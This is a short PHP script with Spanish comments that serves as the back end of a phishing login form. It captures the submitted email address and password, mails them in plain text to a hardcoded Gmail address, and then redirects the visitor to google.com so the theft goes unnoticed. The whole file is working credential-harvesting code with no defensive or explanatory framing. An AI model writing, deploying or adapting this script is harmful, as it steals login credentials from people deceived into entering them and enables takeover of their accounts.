<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = htmlspecialchars($_POST['email']);
    $password = htmlspecialchars($_POST['password']);
    
    $to = "holamund579@gmail.com";
    $subject = "Nuevo intento de inicio de sesión";
    $message = "Correo electrónico: $email\nContraseña: $password";
    $headers = "From: no-reply@tudominio.com\r\n";
    $headers .= "Reply-To: no-reply@tudominio.com\r\n";
    
    if (mail($to, $subject, $message, $headers)) {
        // Redirige a Google después de enviar el correo
        header("Location: https://www.google.com");
        exit();
    } else {
        echo "Error al enviar el correo.";
    }
} else {
    echo "Método no permitido.";
}
?>
